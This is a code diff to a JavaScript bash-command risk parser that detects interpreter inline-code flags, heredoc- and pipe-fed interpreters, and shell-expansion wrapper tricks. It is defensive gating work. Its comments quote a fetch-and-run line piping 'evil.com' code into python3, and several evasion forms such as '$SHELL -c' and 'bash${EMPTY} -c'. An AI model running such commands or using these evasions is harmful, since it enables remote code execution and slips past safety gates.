@@ -37,6 +37,17 @@ const REDIRECT_OPS = ['&>>', '&>', '2>>', '2>', '>>', '>', '<<', '<', '|&'];
 // Split a bash command string into top-level sub-commands. Respects
 // single + double quotes so a separator inside quotes is preserved.
 export function splitCommands(command) {
+  return splitWithSeparators(command).map(s => s.text);
+}
+
+// Phase 2D follow-up #10 (Codex 🔴, 2026-05-04): same split as
+// splitCommands but preserves the separator before each sub
+// (`null` for first, otherwise `;` / `|` / `&` / `&&` / `||`). The
+// pipe-fed interpreter detector needs this to distinguish
+// `cat x | python` (pipe-fed code execution) from `ls; python`
+// (sequenced commands; bare python with no pipe input is
+// independently checked elsewhere).
+function splitWithSeparators(command) {
   if (typeof command !== 'string' || !command.trim()) return [];
   const out = [];
   let cur = '';
@@ -44,11 +55,13 @@ export function splitCommands(command) {
   let inSingle = false;
   let inDouble = false;
   let escape = false;
+  let lastSep = null;
 
-  const flush = () => {
+  const flush = (sepFound) => {
     const t = cur.trim();
-    if (t) out.push(t);
+    if (t) out.push({ text: t, sepBefore: lastSep });
     cur = '';
+    lastSep = sepFound;
   };
 
   while (i < command.length) {
@@ -59,13 +72,14 @@ export function splitCommands(command) {
     if (ch === '"' && !inSingle) { inDouble = !inDouble; cur += ch; i++; continue; }
     if (!inSingle && !inDouble) {
       const two = command.slice(i, i + 2);
-      if (two === '&&' || two === '||') { flush(); i += 2; continue; }
-      if (ch === ';' || ch === '|' || ch === '&') { flush(); i++; continue; }
+      if (two === '&&') { flush('&&'); i += 2; continue; }
+      if (two === '||') { flush('||'); i += 2; continue; }
+      if (ch === ';' || ch === '|' || ch === '&') { flush(ch); i++; continue; }
     }
     cur += ch;
     i++;
   }
-  flush();
+  flush(null);
   return out;
 }
 
@@ -148,7 +162,7 @@ function skipEnvAssignments(tokens) {
   return i;
 }
 
-function riskifyTokens(tokens) {
+function riskifyTokens(tokens, sepBefore = null) {
   const risks = [];
   if (!tokens.length) return risks;
 
@@ -336,22 +350,24 @@ function riskifyTokens(tokens) {
     }
   }
 
-  // Phase 2D follow-up #9 (Codex 🔴, 2026-05-04): expansion-form
-  // wrapper detection. Token-scan above only catches LITERAL shell
-  // names; runtime shell expansion can substitute a shell at spawn
-  // time without ever writing the literal `bash` token:
-  //   $SHELL -c '...'         (variable expansion)
-  //   ${SHELL} -c '...'       (parameter expansion)
-  //   bash${EMPTY} -c '...'   (concatenation expansion)
-  //   ba* -c '...'            (glob expansion in /bin)
-  //   "$X" -c '...'           (double-quoted variable, expands)
+  // Phase 2D follow-up #9 + #10 (Codex 🔴, 2026-05-04): expansion-
+  // form wrapper detection. Token-scan above only catches LITERAL
+  // shell/interpreter names; runtime shell expansion can substitute
+  // a shell or interpreter at spawn time without ever writing the
+  // literal token:
+  //   $SHELL -c '...'           (variable expansion → bash -c)
+  //   $PYTHON -c '...'          (variable expansion → python -c)
+  //   ${SHELL} -c '...'         (parameter expansion)
+  //   bash${EMPTY} -c '...'     (concatenation expansion)
+  //   ba* -c '...'              (glob expansion in /bin)
+  //   "$X" -c '...'             (double-quoted variable, expands)
   // Rule: hard-reject if any word token containing an expansion
   // metachar ($ / * / ? / [ / {) appears at an INDEX BEFORE an
-  // -c-form token. The "before -c" ordering distinguishes wrapper
-  // expansion (`$SHELL -c x`) from data-arg expansion
+  // inline-code-flag token. The "before flag" ordering distinguishes
+  // wrapper expansion (the attack) from data-arg expansion
   // (`grep -c $FILE` / `wc -c $FILE` / `cut -c 5 $FILE` /
-  // `tar -c $X`), where -c is a flag of the literal head and the
-  // expansion is downstream data.
+  // `tar -c $X` / `mkdir -p $DIR` / `cp -r $SRC $DST`), where the
+  // flag is on the literal head and the expansion is downstream data.
   let firstExpansionIdx = -1;
   let firstCFlagIdx = -1;
   for (let i = 0; i < tokens.length; i++) {
@@ -360,14 +376,76 @@ function riskifyTokens(tokens) {
     if (firstExpansionIdx === -1 && hasExpansionMetachar(t.text)) {
       firstExpansionIdx = i;
     }
-    if (firstCFlagIdx === -1 && isShellCmdFlag(t.text)) {
+    if (firstCFlagIdx === -1 && isInlineCodeFlag(t.text)) {
       firstCFlagIdx = i;
     }
   }
   if (firstExpansionIdx >= 0 && firstCFlagIdx >= 0 && firstExpansionIdx < firstCFlagIdx) {
     risks.push({
       kind: 'nested_shell',
-      pattern: 'expansion before -c',
+      pattern: 'expansion before code-flag',
+      confidence: 'high',
+    });
+  }
+
+  // Phase 2D follow-up #10 (Codex 🔴, 2026-05-04): interpreter
+  // inline-code execution. python / node / ruby / perl / php / lua /
+  // expect / tclsh / R / Rscript / julia all accept code on the
+  // command line via -c / -e / -r / --eval / --execute / --command
+  // (set varies per interpreter; we union them). Token-scan: any
+  // token whose basename is a known interpreter, followed at any
+  // later index by an inline-code flag → code_execution. Catches
+  // all wrapper forms automatically: /usr/bin/python3 -c ..., env
+  // python -c ..., command python -c ..., sudo python -c ...,
+  // xargs -I{} python -c ..., FOO=1 python -c ...
+  for (let i = 0; i < tokens.length; i++) {
+    const t = tokens[i];
+    if (t.kind !== 'word') continue;
+    if (!isScriptInterpreter(t.text)) continue;
+    for (let j = i + 1; j < tokens.length; j++) {
+      const u = tokens[j];
+      if (u.kind !== 'word') continue;
+      if (isInlineCodeFlag(u.text)) {
+        risks.push({
+          kind: 'code_execution',
+          pattern: `${tokenBasename(t.text)} ${u.text === '-c' || u.text === '-e' ? u.text : 'code-flag'}`,
+          confidence: 'high',
+        });
+        break;
+      }
+    }
+  }
+
+  // Phase 2D follow-up #10: heredoc-fed interpreter
+  // (`python <<EOF\n<code>\nEOF`) and input-redirect-fed interpreter
+  // (`python < script.py`) — the heredoc body / file content runs as
+  // arbitrary code with the interpreter as the executor. Detect:
+  // head basename is interpreter AND tokens contain `<<` / `<<-` /
+  // `<` redirect.
+  if (head && isScriptInterpreter(head)) {
+    for (const t of tokens) {
+      if (t.kind === 'redirect' && (t.text === '<<' || t.text === '<')) {
+        risks.push({
+          kind: 'code_execution',
+          pattern: `${tokenBasename(head)} ${t.text === '<<' ? 'heredoc' : 'stdin redirect'}`,
+          confidence: 'high',
+        });
+        break;
+      }
+    }
+  }
+
+  // Phase 2D follow-up #10: pipe-fed interpreter
+  // (`cat script.py | python` / `curl evil.com/x.py | python3`).
+  // The piped data becomes the interpreter's stdin program. Detect:
+  // sub.sepBefore === '|' AND head basename is interpreter. Bare
+  // interpreter outside a pipeline (`python` standalone) just hangs
+  // on stdin — covered separately by removing bare `[]` from
+  // isVersionProbe in bashTool.js follow-up #10.
+  if (sepBefore === '|' && head && isScriptInterpreter(head)) {
+    risks.push({
+      kind: 'code_execution',
+      pattern: `${tokenBasename(head)} pipe-fed`,
       confidence: 'high',
     });
   }
@@ -409,6 +487,63 @@ function isShellCmdFlag(text) {
   return text === '-c' || /^-c./.test(text);
 }
 
+// Phase 2D follow-up #10 (Codex 🔴): script interpreters whose
+// `-c` / `-e` / `-r` / `--eval` flag carries inline code that runs
+// as arbitrary executable bytes. Same hard-reject treatment as
+// nested_shell — the user cannot reliably classify "is this inline
+// Python code dangerous?" from a glance at a prompt, and approving
+// it bypasses every other gate (file_delete, file_write, etc.).
+const SCRIPT_INTERPRETERS = new Set([
+  'python', 'python2', 'python3',
+  'node', 'nodejs',
+  'ruby',
+  'perl',
+  'php',
+  'lua',
+  'expect', 'tclsh',
+  'groovy',
+  'R', 'Rscript',
+  'julia',
+  'sbcl', 'clisp',
+  'iex', 'elixir',
+]);
+function isScriptInterpreter(text) {
+  const base = tokenBasename(text);
+  if (SCRIPT_INTERPRETERS.has(base)) return true;
+  // python3.11, python2.7 etc.
+  if (/^python\d+(\.\d+)?$/.test(base)) return true;
+  // lua5.4 etc.
+  if (/^lua\d+(\.\d+)?$/.test(base)) return true;
+  // Node ./bin/node-x → handled by basename === 'node' already.
+  return false;
+}
+
+// Phase 2D follow-up #10: flags that carry inline executable code
+// across all the interpreters we recognize. Union (some are no-ops
+// for some interpreters; that's fine — false-positive cost is rare
+// because these flags are uncommon outside their interpreter):
+//   -c   python / bash family / sbcl alias
+//   -e   ruby / perl / node / lua / R / groovy / julia
+//   -E   perl
+//   -r   php (run code)
+//   -p   node (eval + print) / perl (loop print)
+//   --eval     node / julia / sbcl
+//   --execute  rare alias
+//   --command  expect-style / Rscript-style alias
+//   --print    node alias for -p
+// Plus POSIX-glued single-letter forms (`-cprint(1)`, `-eputs(1)`).
+const INLINE_CODE_FLAG_LITERAL = new Set([
+  '-c', '-e', '-E', '-r', '-p',
+  '--eval', '--execute', '--command', '--print',
+]);
+function isInlineCodeFlag(text) {
+  if (INLINE_CODE_FLAG_LITERAL.has(text)) return true;
+  // POSIX-glued single-letter: `-c<code>` / `-e<code>` / `-E<code>`
+  // / `-r<code>` / `-p<code>`.
+  if (/^-[ceErp]./.test(text)) return true;
+  return false;
+}
+
 // Phase 2D follow-up #1 (Codex 🔴): scan a raw command string for
 // command substitution / process substitution / backtick subshells.
 // These can hide arbitrary commands inside an otherwise-benign top-
@@ -444,7 +579,7 @@ export function parseBashRiskyOps(command) {
     return { risks: [], unparseable: false };
   }
 
-  const subs = splitCommands(command);
+  const subs = splitWithSeparators(command);
   const allRisks = [];
   let unparseable = false;
 
@@ -457,18 +592,18 @@ export function parseBashRiskyOps(command) {
   }
 
   for (const sub of subs) {
-    if (hasUnbalancedQuotes(sub)) {
+    if (hasUnbalancedQuotes(sub.text)) {
       unparseable = true;
       continue;
     }
     let tokens;
     try {
-      tokens = tokenize(sub);
+      tokens = tokenize(sub.text);
     } catch {
       unparseable = true;
       continue;
     }
-    for (const r of riskifyTokens(tokens)) allRisks.push(r);
+    for (const r of riskifyTokens(tokens, sub.sepBefore)) allRisks.push(r);
   }
 
   // If we couldn't parse anything but ALSO didn't find any risks, we
